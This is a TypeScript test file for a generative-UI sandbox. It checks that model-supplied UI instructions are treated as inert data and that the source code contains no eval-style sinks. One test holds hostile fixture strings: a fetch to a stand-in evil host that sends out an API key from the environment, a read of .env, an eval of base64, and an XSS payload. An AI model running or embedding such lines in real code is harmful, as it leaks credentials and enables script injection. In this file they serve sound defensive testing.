/**
 * Generative-UI sandbox test cases (SR-02 / S4 A5).
 *
 * The isolation argument (ADR-007 §3.5): the model supplies DATA only — the
 * rendering surface is compiled-in trusted components, so network requests,
 * local-file reads, and key access cannot be *initiated* by an instruction.
 * These cases pin that boundary:
 * 1. unknown component keys never reach the registry (gate → static fallback);
 * 2. hostile payload strings (fetch / fs / env-key access) pass through the
 *    validation layer UNCHANGED as inert data — never interpreted;
 * 3. oversized or non-serializable payloads are rejected into the fallback;
 * 4. the surface sources contain no dynamic execution sinks (tripwire).
 */
import { readdirSync, readFileSync } from 'node:fs'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { describe, expect, it } from 'vitest'
import type { ToolArgs } from '@deepseek-ai/dsh-client-ui-chat/client'
import { instructionReady, payloadWithinCap, readInstruction, INSTRUCTION_PAYLOAD_CAP, type UiComponentKey } from './instruction.ts'
import { registerUiSurface, uiSurfaceOf } from './registry.ts'

/** Minimal PartialArguments stub over plain maps (readInstruction's only face). */
function stubArgs(texts: Record<string, string> = {}, values: Record<string, unknown> = {}): ToolArgs {
  return {
    has: (key: string) => key in texts || key in values,
    text: (key: string) => texts[key],
    complete: (key: string) => key in values,
    value: (key: string) => values[key],
  } as unknown as ToolArgs
}

describe('instruction gate', () => {
  it('rejects an unknown component key — it can never reach the registry', () => {
    const instruction = readInstruction(stubArgs(
      { id: 'ui-x', component: 'fs-reader', target: 'inline' },
      { props: {} },
    ))
    expect(instruction.component).toBeUndefined()
    expect(instructionReady(instruction)).toBe(false)
  })

  it('rejects a hostile component key shaped like an executor', () => {
    for (const key of ['exec', 'run_code', 'fetch-proxy', 'key-reader']) {
      const instruction = readInstruction(stubArgs({ id: 'ui-x', component: key, target: 'inline' }, { props: {} }))
      expect(instruction.component).toBeUndefined()
    }
  })

  it('rejects an unknown target and keeps the known ones', () => {
    expect(readInstruction(stubArgs({ target: 'iframe' })).target).toBeUndefined()
    expect(readInstruction(stubArgs({ target: 'canvas' })).target).toBe('canvas')
  })

  it('gates on identity, component, and props', () => {
    const base = { id: 'ui-x', target: 'inline' as const, component: 'form' as const, title: undefined }
    expect(instructionReady({ ...base, props: undefined, data: undefined, summary: undefined })).toBe(false)
    expect(instructionReady({ ...base, id: undefined, props: {}, data: undefined, summary: undefined })).toBe(false)
    expect(instructionReady({ ...base, props: {}, data: undefined, summary: undefined })).toBe(true)
  })
})

describe('payload boundary', () => {
  it('passes hostile strings through as UNCHANGED inert data', () => {
    const hostile = {
      network: 'fetch("http://evil.example/collect?key=" + process.env.API_KEY)',
      file: 'require("node:fs").readFileSync(".env", "utf8")',
      exec: 'eval(atob("Y29uc29sZS5sb2coMSk="))',
      markup: '<img src=x onerror="fetch(\'//evil\')"><script>alert(1)</script>',
    }
    const instruction = readInstruction(stubArgs(
      { id: 'ui-evil', component: 'table', target: 'inline' },
      { props: hostile },
    ))
    // The pipeline treats the payload as opaque data: the exact strings
    // survive validation untouched, ready to be escaped as TEXT by the
    // trusted component — never interpreted as code.
    expect(instruction.props).toEqual(hostile)
    expect((instruction.props as typeof hostile).network).toBe(hostile.network)
  })

  it('rejects an oversized payload into the static fallback', () => {
    const big = { blob: 'x'.repeat(INSTRUCTION_PAYLOAD_CAP + 1) }
    expect(payloadWithinCap(big, undefined)).toBe(false)
    expect(instructionReady({ id: 'ui-x', target: 'inline', component: 'table', title: undefined, props: big, data: undefined, summary: undefined })).toBe(false)
  })

  it('rejects a non-serializable payload', () => {
    const circular: Record<string, unknown> = {}
    circular.self = circular
    expect(payloadWithinCap(circular, undefined)).toBe(false)
  })

  it('accepts a normal payload within the cap', () => {
    expect(payloadWithinCap({ a: 1 }, { rows: [1, 2, 3] })).toBe(true)
  })
})

describe('registry boundary', () => {
  it('returns undefined for an unregistered key at runtime', () => {
    expect(uiSurfaceOf('definitely-not-registered' as UiComponentKey)).toBeUndefined()
    registerUiSurface('form', () => null)
    expect(uiSurfaceOf('form')).toBeDefined()
  })
})

describe('no dynamic execution sinks (source tripwire)', () => {
  it('genui + client sources contain no eval/new Function/document.write sinks', () => {
    const root = join(dirname(fileURLToPath(import.meta.url)))
    const files = readdirSync(root).filter((name) => /\.tsx?$/.test(name) && !name.endsWith('.test.ts'))
    expect(files.length).toBeGreaterThan(3)
    const sinks = /\bnew\s+Function\b|\beval\s*\(|\bdocument\.write\b|\bsetTimeout\s*\(\s*['"`]/
    for (const name of files) {
      const source = readFileSync(join(root, name), 'utf8')
      expect({ file: name, hit: sinks.test(source) }).toEqual({ file: name, hit: false })
    }
  })
})
